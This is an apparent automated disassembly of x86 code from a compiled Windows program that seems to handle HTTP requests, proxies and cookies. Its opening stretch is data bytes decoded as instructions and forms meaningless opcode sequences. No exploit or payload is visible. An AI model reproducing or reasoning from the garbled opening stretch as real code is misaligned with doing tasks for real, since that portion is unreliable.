or eax [ eax ]
add [ ecx + eax ] dl
add bh bh
adc al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push eax
jb r-xdata
add bh bh
mov al [ 0x100488f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410c0009 ] al
insb
insb
outsd
ja r-xdata
push 0x72746552
imul esp [ ebp + 0x73 ] r-xdata
or al 0x1
push eax
dec edi
jo r-xdata
insd
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x5207000e ] al
je r-xdata
insb
arpl [ gs : ecx + eax * 2 + 0x75 ] si
je r-xdata
imul ebp [ edi + 0x6e ] 0x48730873
jae r-xdata
lodsb [ esi ]
push esp
dec eax
add [ ecx + eax ] ch
add bh bh
sub al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x72500b00
outsd
js r-xdata
imul esi [ fs : edx + 0x65 ] 0x73747463
jae r-xdata
jno r-xdata
add [ eax ] al
or [ esi ] 0x0
pop es
push edx
arpl [ edi + 0x6c ] bp
push esi
jb r-xdata
clc
jae r-xdata
outsd
jb r-xdata
add [ eax ] al
adc [ ebx ] 0x0
sbb cl [ edi + 0x6e ]
inc ecx
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
jae r-xdata
dec eax
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f150012 ] al
outsb
push ebx
insb
xor [ gs : edx + 0x48 ] 0x0
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or cl [ edi + 0x6e ]
push edx
push eax
popad
jb r-xdata
jb r-xdata
sub [ edx + 0x48 ] dh
add [ ecx ] ah
add [ eax ] eax
jmp [ ecx ]
jae r-xdata
js r-xdata
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x1
add bh bh
sbb al 0x1
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x4d
popad
outsb
popad
jb r-xdata
add [ eax + 0x1 ] bl
add bh bh
push eax
jb r-xdata
pop eax
add [ eax ] eax
[ eax + 0x1 ]
jpe r-xdata
add [ eax ] 0x0
add [ eax + 0x430d0016 ] al
inc ecx
jne r-xdata
push ebx
insb
arpl [ gs : eax + edx * 2 + 0x72 ] si
outsd
js r-xdata
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f1a0013 ] al
outsb
imul ebp [ ecx + 0x62 ] 0x7280656c
dec eax
add [ eax ] bh
add [ eax ] eax
imul esi [ fs : edx + 0x65 ] 0x73747463
add [ eax ] dh
add [ eax ] eax
push [ eax ]
dec eax
popad
jb r-xdata
adc [ eax ] 0x0
adc cl [ edi + 0x6e ]
insd
jae r-xdata
outsd
outsb
clc
jae r-xdata
arpl [ esp + esi * 2 + 0x73 ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x48 ] dh
dec edx
dec eax
add ah bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
push 0x7a69726f
popad
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
or al 0x0
rsqrtps xmm4 [ ebp + 0x64 ]
imul esi [ edx + 0x65 ] 0x614d7463
add [ eax ] eax
[ ecx + eax ]
jne r-xdata
jns r-xdata
add [ eax + 0x1 ] dl
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0014 ] al
outsb
inc ecx
jne r-xdata
add [ eax ] bl
je r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc al [ ebp + 0x49 ]
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
push eax
jb r-xdata
dec eax
add [ eax ] al
add [ eax ] al
je r-xdata
inc ecx
pop eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ 0x6b6f6f43 ] cl
imul esp [ ebp + 0x4d ] 0x67616e61
jb r-xdata
add [ edi + edx * 4 - 0x67bfffb8 ] al
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x430a0017 ] al
push 0x7a69726f
popad
je r-xdata
or [ eax ] al
je r-xdata
inc ebp
dec ecx
dec eax
push esp
push esp
push eax
push eax
jb r-xdata
arpl [ edi + 0x6c ] bp
nop
aam 0x7b
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jpo r-xdata
add [ eax ] al
push 0x7a69726f
popad
je r-xdata
add [ eax + 0x4f140015 ] al
outsb
dec eax
add [ eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
jae r-xdata
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ edx ] cl
inc ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
mov eax eax
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x128 ]
arpl [ edi + 0x6c ] bp
inc ebp
js r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x10004010 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
jpo r-xdata
add [ eax ] al
outsd
outsb
mov esp 0xf8004842
add [ eax ] al
dec eax
xchg ecx eax
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
xor [ cs : eax ] al
dec eax
add [ eax ] al
loopne r-xdata
outsd
jb r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
jo r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
les ebx [ edx + 0x7c240047 ]
dec eax
add [ eax + eax ] dl
add [ eax ] al
xor al 0x96
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x6e4f1400
inc eax
add [ eax + 0x7b ] dh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x124 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x12c ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47f7dc
test bl bl
jle r-xdata
xchg esi eax
sub [ ecx ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] 0xffffff90
inc [ ebx ]
sub_487c24
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
xor edx edx
mov eax esi
call sub_479ac4
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0x8 ]
call sub_404e98
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_487cc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_487d4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
movzx ebx [ esi + 0x114 ]
test [ esi + 0x121 ] 0x2
jne r-xdata
mov eax esi
call sub_47fde0
push edi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0xffffffff
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x9c ]
mov [ esi + 0x114 ] bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487d55
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov [ esi + 0x114 ] 0x0
sub_487d70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_487e0a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_487ded
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_487cc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487df4
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
call sub_404e98
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_487e1c
push ebp
mov ebp esp
push ecx
push ebx
movzx ebx [ eax + 0x120 ]
mov [ ebp - 0x1 ] bl
cmp [ eax + 0x13a ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn 0x4
lea ebx [ ebp + 0x8 ]
push ebx
lea ebx [ ebp - 0x1 ]
push ebx
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_487e5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_487ede
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0xf8 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487ee5
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x8c ]
mov edx [ rw-data ]
call sub_4040f0
mov ecx eax
mov edx edi
mov eax esi
call sub_48439c
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_480ea0
sub_487efc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_48815d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x12c ]
mov eax [ eax + 0x10 ]
call sub_405120
test eax eax
jle r-xdata
mov edx [ edi + 0xa0 ]
test edx edx
je r-xdata
mov eax [ edi + 0x12c ]
mov edx [ eax + 0x10 ]
mov eax [ edi + 0xc0 ]
call sub_464d00
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov ebx [ edi + 0x124 ]
mov edx [ ebx + 0x18 ]
call sub_404edc
mov edx [ ebx + 0x10 ]
mov ecx 0x50
mov eax [ r-xdata ]
call sub_462668
mov esi eax
mov edx [ ebp - 0x4 ]
mov eax [ edi + 0xc0 ]
call sub_464d00
test al al
je r-xdata
mov eax [ edx + 0xd0 ]
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
mov eax [ edi + 0x12c ]
mov eax [ eax + 0xc ]
cmp eax [ edi + 0xd4 ]
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
cmp esi [ edi + 0xd4 ]
je r-xdata
mov edx [ edi + 0x124 ]
movzx edx [ edx + 0x2c ]
cmp dl [ eax + 0x31 ]
je r-xdata
lea eax [ ebp - 0x4 ]
mov ebx [ edi + 0x12c ]
mov edx [ ebx + 0x10 ]
call sub_404edc
mov esi [ ebx + 0xc ]
mov eax [ edi + 0x124 ]
mov eax [ eax + 0x8 ]
mov edx r-xdata
call sub_464d00
test al al
je r-xdata
mov eax edi
call sub_47fde0
mov eax [ edi + 0x124 ]
mov eax [ eax + 0x8 ]
mov edx r-xdata
call sub_464d00
test al al
je r-xdata
mov eax edi
call sub_47fde0
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
mov ebx [ edi + 0x8c ]
test ebx ebx
je r-xdata
mov ebx [ edi + 0x8c ]
test ebx ebx
je r-xdata
mov ebx [ edi + 0x8c ]
test ebx ebx
je r-xdata
mov ebx [ edi + 0x8c ]
test ebx ebx
je r-xdata
mov eax edi
call sub_47fde0
mov bl 0x2
jmp r-xdata
mov eax ebx
mov edx [ rw-data ]
call sub_4040f0
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
mov eax ebx
mov edx [ rw-data ]
call sub_4040f0
test al al
je r-xdata
xor ebx ebx
mov eax ebx
mov edx [ rw-data ]
call sub_4040f0
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov eax ebx
mov edx [ rw-data ]
call sub_4040f0
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488164
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
jmp r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
xor edx edx
mov eax [ edi + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov bl 0x1
jmp r-xdata
sub_488180
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_48821b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_477d64
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call ebx
mov ebx eax
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_462668
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488222
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
sub ecx 0x1
jno r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
call sub_403e34
sub_488244
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4884c7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xfc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_489778
mov eax [ eax + 0x10 ]
mov edx r-xdata
call sub_405270
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4884ce
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x14 ]
call sub_404e44
retn
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_489778
mov eax [ eax + 0x10 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
lea ecx [ ebp - 0x1c ]
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_474648
push ebp
call sub_488180
pop ecx
mov ebx eax
test ebx ebx
jle r-xdata
xor edx edx
push ebp
push sub_48849d
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx r-xdata
call sub_480c80
mov edx [ ebp - 0x14 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
jle r-xdata
jle r-xdata
cmp [ eax + 0x18 ] 0x0
jbe r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_477d64
jmp r-xdata
mov eax ebx
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
xor ecx ecx
mov edx [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xac ]
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_477d64
push ebp
call sub_488180
pop ecx
mov ebx eax
test ebx ebx
jg r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
xor edx edx
push ebp
push j_sub_404570#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
push [ eax + 0x1c ]
push [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
xor ecx ecx
mov edx [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xac ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov cl 0x1
mov edx [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xac ]
mov eax [ ebp - 0x10 ]
dec eax
je r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_4192e0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x90 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xfc ]
mov edx [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x44 ]
jmp r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x90 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xfc ]
mov edx [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
jmp r-xdata
retn
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462560
sub_488524
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x4 ] 0x0
mov ebx edi
test ebx ebx
jl r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
call sub_403e2c
cmp esi edi
jle r-xdata
mov edx [ esp ]
mov edx [ edx + esi * 4 ]
call sub_405270
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov [ esp + 0x4 ] 0x1
jmp r-xdata
mov eax ebp
test esi esi
jl r-xdata
sub_488574
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_488958
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ esi + 0xac ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ff04
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_488929
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ ebx + 0x124 ]
add eax 0x20
mov edx [ esi + 0x8c ]
call sub_404e98
mov eax [ ebx + 0x124 ]
add eax 0x24
mov edx [ esi + 0x80 ]
call sub_404e98
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebx + 0x124 ]
mov eax [ eax + 0x14 ]
mov ecx r-xdata
call sub_472f48
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x124 ]
add eax 0x14
call sub_404e98
mov eax [ ebx + 0x124 ]
add eax 0x4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
call sub_404e98
mov eax [ ebx + 0x124 ]
add eax 0x28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
call sub_404e98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ esi + 0x8c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
call sub_404e98
lea eax [ esi + 0x80 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
call sub_404e98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ ebx + 0x124 ]
add eax 0x18
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
call sub_404e98
mov eax [ ebx + 0x124 ]
mov eax [ eax + 0x8 ]
mov edx r-xdata
call sub_464d00
test al al
je r-xdata
mov eax [ ebx + 0x124 ]
add eax 0x8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404e98
jmp r-xdata
mov eax [ ebx + 0x124 ]
add eax 0x8
mov edx r-xdata
call sub_404e98
mov eax [ ebx + 0x124 ]
add eax 0x8
mov edx r-xdata
call sub_404e98
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx r-xdata
call sub_464d00
test al al
je r-xdata
mov eax [ ebx + 0x124 ]
add eax 0x10
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
call sub_404e98
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx r-xdata
call sub_464d00
test al al
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx 0x50
mov eax [ r-xdata ]
call sub_4625b0
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x124 ]
add eax 0x10
call sub_404e98
jmp r-xdata
mov edi [ ebx + 0x124 ]
push [ edi + 0x14 ]
push [ edi + 0x4 ]
push [ edi + 0x28 ]
lea eax [ esi + 0xac ]
mov edx 0x3
call sub_4051e4
mov eax [ esi + 0xb0 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov eax [ ebx + 0x124 ]
mov eax [ eax + 0x10 ]
call sub_405120
test eax eax
jg r-xdata
lea ecx [ ebp - 0x10 ]
mov edx 0x1bb
mov eax [ r-xdata ]
call sub_4625b0
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x124 ]
add eax 0x10
call sub_404e98
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2c ]
mov [ esi + 0xb9 ] al
mov edx [ ebx + 0x124 ]
mov [ edx + 0x2c ] al
mov eax r-xdata
mov [ ebp - 0x24 ] eax
mov eax r-xdata
mov [ ebp - 0x20 ] eax
mov eax r-xdata
mov [ ebp - 0x1c ] eax
mov eax r-xdata
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x24 ]
mov eax [ esi + 0xb0 ]
mov ecx 0x3
call sub_488524
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx r-xdata
call sub_464d00
test al al
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov edi [ esi + 0xb4 ]
test edi edi
je r-xdata
cmp [ ebx + 0x114 ] 0x1
je r-xdata
lea eax [ esi + 0xac ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
call sub_404e98
push 0xffffffff
push 0xffffffff
mov eax esi
call sub_486328
mov eax edi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_486328
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
lea eax [ esi + 0x90 ]
mov edx [ ebx + 0x124 ]
mov edx [ edx + 0x18 ]
call sub_404e98
mov edi [ ebx + 0x124 ]
push [ edi + 0x18 ]
push r-xdata
push [ edi + 0x10 ]
lea eax [ esi + 0x90 ]
mov edx 0x3
call sub_4051e4
jmp r-xdata
lea ecx [ ebp - 0x2c ]
mov edx 0x50
mov eax [ r-xdata ]
call sub_4625b0
mov edx [ ebp - 0x2c ]
mov eax [ ebx + 0x124 ]
mov eax [ eax + 0x10 ]
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488930
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_488930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48895f
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404e68
retn
sub_4889e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4898fc
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47fde0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push j_sub_404570#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x124 ]
movzx edx [ eax + 0x2c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_488a84
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_488ebe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_487efc
mov ebx eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xb8 ] bl
cmp bl 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
